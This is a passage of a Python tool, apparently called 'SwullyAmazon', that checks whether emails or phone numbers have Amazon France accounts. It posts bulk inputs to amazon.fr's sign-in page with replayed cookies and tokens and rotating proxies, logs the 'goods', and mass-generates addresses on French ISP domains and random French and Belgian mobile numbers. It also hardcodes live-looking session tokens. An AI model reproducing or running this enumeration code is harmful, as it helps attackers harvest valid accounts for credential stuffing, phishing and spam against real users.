        mainpool.imap_unordered(self.AmazonNum, self.email)
        mainpool.close()
        mainpool.join()
        if AmazonNum.checked == AmazonNum.loaded:
            print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "\nFinished Larezed " + str(AmazonNum.checked) + " mails! |Goods: " + str(AmazonNum.valid) + " mails - Bads: " + str(AmazonNum.invalid) + " mails ! |Errors: " + str(AmazonNum.recheck), flush=True)
        print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "\nPress any key to continue:")
        r = input()
        main()

    def AmazonNum(self, email):

        data = {'appActionToken': 'Yq2mhgfDpdFgAc7Q0195zsKMhMgj3D',
                'appAction': 'SIGNIN_PWD_COLLECT',
                'subPageType': 'SignInClaimCollect',
                'openid.return_to': 'ape:aHR0cHM6Ly93d3cuYW1hem9uLmZyLz9yZWZfPW5hdl9zaWduaW4=',
                'prevRID': 'ape:MDU0NEE2SjhFRlFRUTYyN1dKVjQ=',
                'workflowState': 'eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.82kD-hdrp3qMJkrTTdkc7Kc08KLPQBHL_iQoQ2pjIS8D31IZSfbInA.90U5VKcKctZvMWjr.o5bTk4T5fy7FanxrQ70Wd9a7Yeg7j8PwNCf31MdIe_tCA2xU4aDIeFto4vZZ_WOuNIRDKX3wCSfPtNeRwWKZSYEf9iy5STM6hyqrBd8dn6HAj2scs056iFAFf6nbuTvZzZ4PMNkbe9XAlm49L9UhlE2WhNYp9J1C4v_BKloM8634tt3qqr6TJmE7sF2ALES8v27bQGYVbC0TT7gnvRhbd2J9KiXpNRw3ksFN9hxvbOmHSMd5yQ4LS9h8BxNWmO0d5_687P05l20JZ6TJHdY1-JD2aNnK4Gp96DGTQu2WYKexFuz0-wo3RJVqcJJUGQTTIKz9._B41CuwhGFlx-f0Rgma_bA',
                'email': email,
                'password': '',
                'create': '0',
                'metadata1': 'ECdITeCs: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'}
        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "fr,en-US;q=0.9,en;q=0.8",
            "cache-control": "max-age=0",
            "content-length": "9702",
            "content-type": "application/x-www-form-urlencoded",
            "cookie": 'signin-sso-state-fr=9a588507-c1d0-47d2-9b4e-24660962a172; session-id=259-0765909-8490911; ubid-acbfr=257-0984503-1653536; s_cc=true; s_nr=1628038460339-New; s_vnum=2060038460339%26vn%3D1; s_dslv=1628038460342; s_sq=%5B%5BB%5D%5D; s_ppv=28; lc-acbfr=fr_FR; sst-acbfr=Sst1|PQF8-IR2JwMpPCYbuYCWXsn0CUByhtpw3G-ru2dOH1cCAwob0wV9_PHM53N5vhYwOh_10q-TmrnyJiDIubhN1vQRwdPX6zr81XepEK4gwVCPuknVsOTraJuLC0KTDLWGpSH1zA7fOq5sI8sp8fDRlnH1nLMf1LgfkKNoSMXBG-bfJLJhyF5VfnhJ_ARRFXOqeEDXqYsSFjZOevjChkRdY4s7xdFORfxpv-R00B-KXv6bpxR5aMOjnQqHGWrJlldWQaAaFYqSpQ-DsuQfb4D5C1_Mrnc7AKc8KU9WPCsuxnvlu1w; i18n-prefs=EUR; session-token="79xix76gKPVVnFiaW9dcHSh+Um4/4J7yi5BR0BAjliXf2Cun5JLeD2BpFKgO1kZsu6ialy8NtAj9qauNFQgn7fHycrZVdsrloQ80RCMZAHbt/T1mWOxDYofcMLA46ZrcaBo1ad7d4dhlfpsZpeEYXjY6OrkE2oZJXv8GCZ3b64qVcmNDT6GuNEdiQSApa9f1CWCU/DwpfDeFd96cXaZltct5FJuJJ1PCv5++TQHAXogh56Hp4H6dkOetF2AAXHzc2cHoMDZFvQ0="; session-id-time=2259697171l; csm-hit=tb:CCFXXEQY6J81PR2CX5JM+b-1QVH157HS0JKGH9N9B30|1628977179563&t:1628977179563&adb:adblk_yes',
            "downlink": "10",
            "ect": "4g",
            "origin": "https://www.amazon.fr",
            "referer": "https://www.amazon.fr/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.fr%2F%3Fref_%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=frflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&",
            "rtt": "150",
            "sec-ch-ua": '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
            "sec-ch-ua-mobile": "?0",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36"}

        try:

            if self.proxyless:
                req = post("https://www.amazon.fr/ap/signin", data=data, headers=headers, timeout=10).text
            else:

                proxy_form = {}
                proxy = choice(self.proxies)
                if proxy.count(':') == 3:
                    spl = proxy.split(':')
                    proxy = f'{spl[2]}:{spl[3]}@{spl[0]}:{spl[1]}'
                else:
                    proxy = proxy
                if proxy in ['', '\n']:
                    try:
                        self.proxylist.remove(proxy)
                        pass
                    except:
                        pass
                if self.proxyType in ['https', 'http']:
                    proxy_form = {'http': f"http://{proxy}", 'https': f"https://{proxy}"}
                elif self.proxyType in ['socks4', 'socks5']:
                    line = f"{self.proxyType}://{proxy}"
                    proxy_form = {'http': line, 'https': line}

                req = post("https://www.amazon.fr/ap/signin", data=data, headers=headers, timeout=10, proxies=proxy_form).text

            if "Entrez votre mot de passe" in req or "Réinitialisation du mot de passe requise" in req:

                AmazonNum.valid += 1
                AmazonNum.checked += 1

                with AmazonNum.lock:
                    print(f"{Fore.LIGHTGREEN_EX}{AmazonNum.checked} ", flush=True)
                    open(f"results/goods/AmazonAmazonNum[{time1} at {time2}].txt", "a+", encoding='utf-8',
                         errors='ignore').write(f"{email}\n")

            elif "Impossible de trouver un compte correspondant à cette adresse e-mail" in req or "Le numéro de téléphone que vous avez saisi ne peut pas être utilisé pour vous identifier. Vérifiez que le numéro que vous avez saisi est correct ou identifiez-vous plutôt avec votre adresse e-mail." in req:

                AmazonNum.invalid += 1
                AmazonNum.checked += 1

                with AmazonNum.lock:
                    print(f"{Fore.LIGHTRED_EX}{AmazonNum.checked}")
                    open(f"results/bads/AmazonNum[{time1} at {time2}].txt", "a+", encoding="utf-8", errors="ignore").write(f"{email}\n")

            else:
                AmazonNum.recheck += 1
                AmazonNum.checked += 1

                with AmazonNum.lock:
                    print(f"{Fore.LIGHTWHITE_EX}{AmazonNum.checked}")
                    open(f"results/errors/AmazonNum[{time1} at {time2}].txt", "a+", encoding='utf-8',
                         errors='ignore').write(f"{email}\n")

        except:

            AmazonNum.recheck += 1
            AmazonNum.checked += 1
            with AmazonNum.lock:
                open(f"results/errors/AmazonNum[{time1} at {time2}].txt", "a+", encoding="utf-8", errors="ignore").write(f"{email}\n")


def MailGenerator(mAmount):
    clearConsole()
    generateds = 0
    mDomain = "domain.com"

    if not path.exists("results/generateds"):
        mkdir("results/generateds")
    if not path.exists("results/generateds"):
        mkdir("results/generateds")

    clearConsole()
    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "Select your mail domain:")
    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "1  > " + Fore.WHITE + "sfr.fr")
    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "2  > " + Fore.WHITE + "orange.fr")
    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "3  > " + Fore.WHITE + "wanadoo.fr")
    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "4  > " + Fore.WHITE + "neuf.fr")
    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "5  > " + Fore.WHITE + "laposte.net")
    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "6  > " + Fore.WHITE + "hotmail.fr")
    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "7  > " + Fore.WHITE + "yahoo.fr")
    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "8  > " + Fore.WHITE + "bbox.fr")
    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "9  > " + Fore.WHITE + "numericable.fr")
    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "10  > " + Fore.WHITE + "custom    *ENTERPRISE")

    mailDomain = input("> ")

    if mailDomain == "1":
        mDomain = "sfr.fr"
    elif mailDomain == "2":
        mDomain = "orange.fr"
    elif mailDomain == "3":
        mDomain = "wanadoo.fr"
    elif mailDomain == "4":
        mDomain = "neuf.fr"
    elif mailDomain == "5":
        mDomain = "laposte.net"
    elif mailDomain == "6":
        mDomain = "hotmail.fr"
    elif mailDomain == "7":
        mDomain = "yahoo.fr"
    elif mailDomain == "8":
        mDomain = "bbox.fr"
    elif mailDomain == "9":
        mDomain = "numericable.fr"
    elif mailDomain == "10":
            cDom = input("Enter your custom domain (ex: example.com): ")
            mDomain = cDom
    else:
        print("\n Not Valid Option")
        time.sleep(3)
        MailGenerator(mAmount)






    clearConsole()
    mSession = requests.session()

    PreReq = mSession.get("https://randommer.io/random-email-address", timeout=10).text
    verificationToken = find_between_r(PreReq, "<input name=__RequestVerificationToken type=hidden value=", '></form>')


    url = "https://randommer.io/random-email-address"

    headers = {
        'Content-Length': '237',
        'Sec-Ch-Ua': '";Not A Brand";v="99", "Chromium";v="94"',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Origin': 'https://randommer.io',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'
    }


    payload = f"number=1000&culture=fr&__RequestVerificationToken={verificationToken}&X-Requested-With=XMLHttpRequest"

    mAmount = int(int(mAmount) / int(1000))

    for x in range(mAmount):

        req = mSession.post(url, data=payload, headers=headers).json()
        for email in req:
            generateds = generateds + 1
            email = email.split("@")[0] + "@" + mDomain
            print(Fore.GREEN + f"[GENERATED] {generateds} - {email}", flush=True)
            open(f"results/generateds/MailGen[{time1} at {time2}].txt", "a+", encoding='utf-8').write(f"{email}\n")

    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "\nFinished Larezed " + str(generateds) + " mails")
    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "\nPress any key to continue:")
    ctn = input()
    main_type()

def NumGenerator():
    num  = f'33{random.randint(600000000, 799999999)}'
    open(f"results/generateds/NumGen[{time1} at {time2}].txt", "a+", encoding='utf-8').write(f"{str(num)}\n")
    print('Generating...')

def NumGeneratorBE():
    num  = f'32{random.randint(400000000, 499999999)}'
    open(f"results/generateds/NumGenBE[{time1} at {time2}].txt", "a+", encoding='utf-8').write(f"{str(num)}\n")
    print('Generating...')


def main_type():

    clearConsole()
    print(Fore.LIGHTRED_EX + """\
  
       
          ▄▄▄▄▄   ▄      ▄   █    █    ▀▄    ▄     ██   █▀▄▀█ ██   ▄▄▄▄▄▄   ████▄    ▄   
         █     ▀▄  █      █  █    █      █  █      █ █  █ █ █ █ █ ▀   ▄▄▀   █   █     █  
       ▄  ▀▀▀▀▄ █   █ ██   █ █    █       ▀█       █▄▄█ █ ▄ █ █▄▄█ ▄▀▀   ▄▀ █   █ ██   █ 
        ▀▄▄▄▄▀  █   █ █ █  █ ███▄ ███▄    █        █  █ █   █ █  █ ▀▀▀▀▀▀   ▀████ █ █  █ 
                █▄ ▄█ █  █ █     ▀    ▀ ▄▀            █    █     █                █  █ █ 
                 ▀▀▀  █   ██                         █    ▀     █                 █   ██ 
                                                    ▀          ▀                        
                                                    
                                                                                                                                                                                     
                        """)
    print(Fore.LIGHTYELLOW_EX + "_______________________________________________________________________________________________________________")                
    print("")          
    print("")
    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "     (1)  " + Fore.LIGHTRED_EX + "Amazon Numéro Checker")
    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "     (2)  " + Fore.LIGHTRED_EX + "Amazon Email Checker")
    print("")

    ans = input(Fore.LIGHTYELLOW_EX + "\nChoose: ")
    if ans == "15":
        while True:
            try:
                thread = 45
                thread.start()
            except:
                pass
    elif ans == "19":
        a = int(input("Combien: "))
        MailGenerator(a)
    elif ans == "1":
        AmazonNum().start()
    elif ans == "2":
        Amazon().start()
    elif ans == "5":
        sendSMS()
    elif ans != "":
        print("\n Not Valid Option")
        time.sleep(3)
        main_type()


def main():

    clearConsole()
    print(Fore.LIGHTRED_EX + """\
  
       
          ▄▄▄▄▄   ▄      ▄   █    █    ▀▄    ▄     ██   █▀▄▀█ ██   ▄▄▄▄▄▄   ████▄    ▄   
         █     ▀▄  █      █  █    █      █  █      █ █  █ █ █ █ █ ▀   ▄▄▀   █   █     █  
       ▄  ▀▀▀▀▄ █   █ ██   █ █    █       ▀█       █▄▄█ █ ▄ █ █▄▄█ ▄▀▀   ▄▀ █   █ ██   █ 
        ▀▄▄▄▄▀  █   █ █ █  █ ███▄ ███▄    █        █  █ █   █ █  █ ▀▀▀▀▀▀   ▀████ █ █  █ 
                █▄ ▄█ █  █ █     ▀    ▀ ▄▀            █    █     █                █  █ █ 
                 ▀▀▀  █   ██                         █    ▀     █                 █   ██ 
                                                    ▀          ▀                        
                                                    
